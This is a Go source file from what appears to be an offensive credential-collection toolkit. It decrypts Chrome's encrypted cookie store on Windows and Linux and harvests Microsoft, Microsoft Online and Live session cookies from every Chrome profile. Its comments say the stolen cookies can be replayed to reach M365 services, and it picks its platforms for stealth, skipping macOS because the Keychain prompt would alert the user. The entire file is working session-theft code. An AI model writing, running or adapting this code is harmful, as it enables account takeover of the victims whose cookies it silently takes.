//go:build !darwin

// Microsoft browser cookie collector — extracts session cookies via Chromium decrypt.
//
// Extracts Microsoft session cookies from Chrome's encrypted Cookies database.
// Targets .microsoft.com, .microsoftonline.com, and .live.com domains.
// These cookies can provide access to M365 services when replayed.
//
// Cross-platform support:
//   - macOS:   SKIPPED (build tag excludes — Keychain prompt is user-visible)
//   - Windows: DPAPI via CryptUnprotectData (silent)
//   - Linux:   PBKDF2 with 'peanuts' hardcoded key
//
// OPSEC:
//   - Windows/Linux: SILENT (DPAPI / hardcoded 'peanuts' key)
//   - macOS: SKIPPED by default (Keychain prompt is user-visible)
package microsoft

import (
	"fmt"

	"github.com/ninken/ninloader-go/internal/chromium"
	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

var msHostPatterns = []string{".microsoft.com", ".microsoftonline.com", ".live.com"}

func init() {
	registry.Register("microsoft", "browser_cookies", func() collector.Collector {
		return &BrowserCookiesCollector{
			BaseCollector: collector.BaseCollector{Svc: "microsoft", Src: "browser_cookies", Plats: []string{"linux", "windows"}},
		}
	})
}

// BrowserCookiesCollector extracts Microsoft session cookies from Chrome's
// encrypted Cookies database via the chromium package.
type BrowserCookiesCollector struct {
	collector.BaseCollector
}

func (c *BrowserCookiesCollector) Service() string    { return c.Svc }
func (c *BrowserCookiesCollector) Source() string      { return c.Src }
func (c *BrowserCookiesCollector) StealthScore() int   { return 5 }
func (c *BrowserCookiesCollector) Platforms() []string { return c.Plats }

// msProfiles returns the list of Chrome profile directory names to scan.
func msProfiles() []string {
	p := []string{"Default"}
	for i := 1; i <= 9; i++ {
		p = append(p, fmt.Sprintf("Profile %d", i))
	}
	return p
}

func (c *BrowserCookiesCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken
	chromeDir := platform.ChromeUserDataDir()

	for _, profile := range msProfiles() {
		cookies, err := chromium.ExtractCookies(chromeDir, profile, msHostPatterns, nil)
		if err != nil || len(cookies) == 0 {
			continue
		}

		results = append(results, &types.DiscoveredToken{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         fmt.Sprintf("%s/%s/Cookies", chromeDir, profile),
			AccountHint:  fmt.Sprintf("chrome:%s", profile),
			StealthScore: c.StealthScore(),
			Details: fmt.Sprintf(
				"Microsoft session cookies (%s); platform=%s",
				joinHostPatterns(msHostPatterns),
				platform.Platform(),
			),
		})
	}

	return results
}

func (c *BrowserCookiesCollector) Collect() []*types.CollectedToken {
	chromeDir := platform.ChromeUserDataDir()

	var results []*types.CollectedToken

	for _, profile := range msProfiles() {
		cookies, err := chromium.ExtractCookies(chromeDir, profile, msHostPatterns, nil)
		if err != nil {
			c.Warn(fmt.Sprintf("Failed to extract cookies from %s: %v", profile, err))
			continue
		}

		if len(cookies) == 0 {
			continue
		}

		// Group cookies by domain for organized output.
		byDomain := make(map[string]map[string]chromium.Cookie)
		for _, ck := range cookies {
			if byDomain[ck.Host] == nil {
				byDomain[ck.Host] = make(map[string]chromium.Cookie)
			}
			byDomain[ck.Host][ck.Name] = ck
		}

		// Build cookie jar dict for the extra field.
		cookieJar := make(map[string]any)
		for host, hostCookies := range byDomain {
			for name, ck := range hostCookies {
				key := fmt.Sprintf("%s:%s", host, name)
				cookieJar[key] = map[string]any{
					"value":    ck.Value,
					"host":     ck.Host,
					"path":     ck.Path,
					"secure":   ck.Secure,
					"httponly":  ck.HTTPOnly,
				}
			}
		}

		// Use the first available cookie value as the primary access_token.
		firstCookie := cookies[0]

		// Collect domain names.
		domains := make([]string, 0, len(byDomain))
		for d := range byDomain {
			domains = append(domains, d)
		}

		tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
		tok.AccessToken = types.Secure(firstCookie.Value)
		tok.Extra["profile"] = profile
		tok.Extra["cookies"] = cookieJar
		tok.Extra["cookie_count"] = len(cookies)
		tok.Extra["domains"] = domains
		tok.Extra["platform"] = platform.Platform()

		results = append(results, tok)

		c.Info(fmt.Sprintf(
			"Extracted %d Microsoft cookies from chrome:%s across %d domains",
			len(cookies), profile, len(byDomain),
		))
	}

	return results
}

func joinHostPatterns(patterns []string) string {
	result := ""
	for i, p := range patterns {
		if i > 0 {
			result += ", "
		}
		result += p
	}
	return result
}
